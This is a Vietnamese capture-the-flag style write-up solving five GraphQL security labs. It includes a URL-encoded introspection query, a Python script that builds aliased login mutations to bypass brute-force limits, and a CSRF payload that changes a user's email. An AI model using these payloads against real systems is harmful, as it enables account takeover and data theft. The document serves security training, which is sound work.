---
title: 'Web14: GraphQL API vulnerabilities'
tags: [web14]

---

# **1. Lab: Accessing private GraphQL posts**
![image](https://hackmd.io/_uploads/S193fdCv0.png)

>Truy cập lab, khi load trang chủ thì có 1 request `POST /graphql/v1` để fetch data từ server sử dụng GraphQL API:
>![image](https://hackmd.io/_uploads/rJ9O3OAwC.png)

>Sử dụng tool InQL để Scan thì phát hiện 2 query `getAllBlogPosts` dùng để truy vấn dữ liệu toàn bộ post và `getBlogPost` dùng để truy vấn dữ liệu của từng post theo id: 
>![image](https://hackmd.io/_uploads/BJJ2huCvC.png)

>Ta sẽ thử truy vấn toàn bộ thuộc tính của query `getAllBlogPosts`
>![image](https://hackmd.io/_uploads/SJ0W6_RPC.png)

>Thành công truy vấn và biết thêm được các thuộc tính bị ẩn:
>![image](https://hackmd.io/_uploads/rkzLT_AvR.png)

>Trong đó có thuộc tính `isPrivate` mang giá trị False, ta có thể đoán ra được nếu nó bằng True thì post này sẽ bị ẩn. Thật vậy, khi lấy toàn bộ post, để ý post với `id=3` không được xuất hiện:
>![image](https://hackmd.io/_uploads/Hyxp6O0D0.png)

>Tiếp theo ta sẽ đi xem các thuộc tính của post với `id=3` bằng query `getBlogPost`:
>![image](https://hackmd.io/_uploads/Skxz0u0wC.png)

>Thay đổi param `id=3` và send:
>![image](https://hackmd.io/_uploads/S1AECu0wR.png)

>Thành công lấy được `"postPassword": "ev31et4y7cq3weiy6q8aapg2cb1n4sxx"` là flag cần tìm!

>Submit và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rkCOCuCvA.png)

# **2. Lab: Accidental exposure of private GraphQL fields**

>Như bài trước, scan thì phát hiện 1 query `getUser`:
>![image](https://hackmd.io/_uploads/SkgzmeKRP0.png)

>Ta sẽ thử thay tham số `id` với từng giá trị nhằm tìm ra tài khoản của admin. Thử với `id=0` thì không trả về giá trị gì:
>![image](https://hackmd.io/_uploads/ryt8eKRv0.png)

>Thử với `id=1` thì ta thành công truy vấn ra được `username` và `password` của admin:
>![image](https://hackmd.io/_uploads/ryVFgYCPC.png)
![image](https://hackmd.io/_uploads/HJz5xYCDA.png)

>Đăng nhập vào tài khoản `administrator` và truy cập Admin Panel:
>![image](https://hackmd.io/_uploads/B1h2lt0wA.png)

>Xóa `carlos` và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/HJ6CeFCPC.png)

# **3. Lab: Finding a hidden GraphQL endpoint**
![image](https://hackmd.io/_uploads/rJ67OTCv0.png)

>Lab này đã che giấu đi endpoint graphQL, khi truy cập trang chủ `/` thì ta không thấy endpoint nào để khai thác:
>![image](https://hackmd.io/_uploads/Bkv1uTADC.png)

>Ta sẽ đi thử xem web này có hỗ trợ call api hay không bằng cách thêm 1 số hậu tố cơ bản , tới khi thêm `/api` thì có phản hồi khác biệt:
>![image](https://hackmd.io/_uploads/Bk5P9aCwA.png)

>Respone phản hồi **"Query not present"**, gợi ý cho ta rằng tại endpoint này có khả năng là endpoint graphQL bị che giấu! Sửa đổi request để chứa một truy vấn chung. Lưu ý rằng vì endpoint đang respone các yêu cầu GET nên ta cần gửi truy vấn dưới dạng tham số URL: `/api?query=query{__typename}`:
>![image](https://hackmd.io/_uploads/HkPEoaCvC.png)

>Trên Payload All The Thing, tìm payload và URL-1encode để tìm introspection của schema:
```
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

```

>Ta có được schema của graphQL:
>![image](https://hackmd.io/_uploads/BkoklRCPA.png)

>Tiến hành lưu schema này ra file:
>![image](https://hackmd.io/_uploads/S1AmlAADA.png)

>Sau đó, tại tool InQL, chọn file mà ta vừa lưu, nó sẽ phân tích ra được các query `getUser` và 1 mutation là `deleteOrganizationUser`
>![image](https://hackmd.io/_uploads/Sy4ieA0DR.png)

>Từ query `getUser`, ta lấy được id của `carlos` là `id=3`:
![image](https://hackmd.io/_uploads/HybnZC0vA.png)

>Tận dụng mutation `deleteOrganizationUser` dùng để xóa user theo id:
>![image](https://hackmd.io/_uploads/HyBdfACDC.png)

>Send request xóa user có `id=3` tương ứng với `carlos`:
>![image](https://hackmd.io/_uploads/H1jPzACDR.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/ryVczCCDR.png)

# **4. Lab: Bypassing GraphQL brute force protections**
![image](https://hackmd.io/_uploads/H1Moy61uA.png)

>Mục tiêu của bài này là đăng nhập vào được `carlos` với list mật khẩu cho trước. 

>Để ý request đăng nhập sử dụng graphQL để thực thi `mutation login`, khi không thành công sẽ trả về `success:false`. 
>![image](https://hackmd.io/_uploads/S1Legay_0.png)

>Khi đăng nhập 3 lần sai liên tiếp thì web chặn ta login và phải chờ 1 phút sau mới được tiếp tục. Rõ ràng chỗ này đã trang bị cơ chế chống brute-force:
>![image](https://hackmd.io/_uploads/rkPIx61OA.png)

>Nhưng có thể bypass bằng cách chỉ cần gửi nhiều request login trong 1 request graph-api duy nhất, server vẫn xử lí tuần tự các request login và trả về respone tương ứng:
>![image](https://hackmd.io/_uploads/BJJ0NTJdR.png)

>Từ đó, với list mật khẩu cho trước, ta sẽ code với 1 request login là 1 bí danh riêng:

>Source code python sử dụng để sinh:
```python
import pyperclip

def main():
    passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon",
                 "123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop",
                 "123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000",
                 "qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster",
                 "soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas",
                 "hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica",
                 "pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753",
                 "aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea",
                 "biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix",
                 "mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

    query = []
    for i, password in enumerate(passwords):
        query.append(f'bruteforce{i}: login(input: {{ password: "{password}", username: "carlos" }}) {{')
        query.append("    token")
        query.append("    success")
        query.append("}")

    query_str = "\n".join(query)
    
    # Copy query to clipboard
    pyperclip.copy(query_str)
    print("The query has been copied to your clipboard.")

if __name__ == "__main__":
    main()

```

>Kết quả send request:
>![image](https://hackmd.io/_uploads/rkEBSpk_0.png)

>Tìm kiếm request login có `success=true`:
>![image](https://hackmd.io/_uploads/BycLBp1O0.png)

>Tìm được mật khẩu tương ứng cho `carlos` là `1234`, login thành công:
>![image](https://hackmd.io/_uploads/HkpKH6JOA.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/BkqqHpyuR.png)

# **5. Lab: Performing CSRF exploits over GraphQL**
![image](https://hackmd.io/_uploads/rkEOO6JdC.png)

>Đăng nhập `wiener` và thử update email thì thấy 1 request sử dụng graphQL để change email:
>![image](https://hackmd.io/_uploads/rkaIPZeO0.png)

>Dễ dàng thấy được `Content-Type: application/json` và khi thay đổi type thì xảy ra lỗi:
>![image](https://hackmd.io/_uploads/Bk06DZed0.png)

>Tuy nhiên, ta có thể sử dụng định dạng `x-www-form-urlencoded` trong query mà server vẫn chấp nhận:
```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22ducanh%40john.com%22%7D%7D
```
![image](https://hackmd.io/_uploads/B1z1FbxuC.png)

>Mà quá trình này ko có bất kì 1 cơ chế bảo vệ nào, như csrf-token, điều này có thể dẫn tới 1 cuộc tấn công CSRF. Chuột phải và chọn **"Genarate CSRF PoC"**:
>![image](https://hackmd.io/_uploads/B1KmF-xu0.png)
![image](https://hackmd.io/_uploads/By2lcZlu0.png)

>Lưu vào exploit-server:
>![image](https://hackmd.io/_uploads/HJyDtWguR.png)

>**"Deliver exploit to victim"**, xem lại log ta thấy rằng victim đã truy cập vào link ta gửi:
>![image](https://hackmd.io/_uploads/H13oFbgO0.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/ryH3FZxu0.png)


